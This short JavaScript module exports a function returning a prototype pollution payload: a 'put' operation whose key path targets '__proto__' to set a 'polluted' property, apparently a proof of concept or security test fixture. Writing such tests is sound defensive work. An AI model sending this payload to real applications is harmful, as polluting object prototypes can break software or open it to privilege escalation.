function getPayload() {
    return [
        { type: "put", key: ["__proto__", "polluted"], value: "yes" }
    ];
}

module.exports = { getPayload };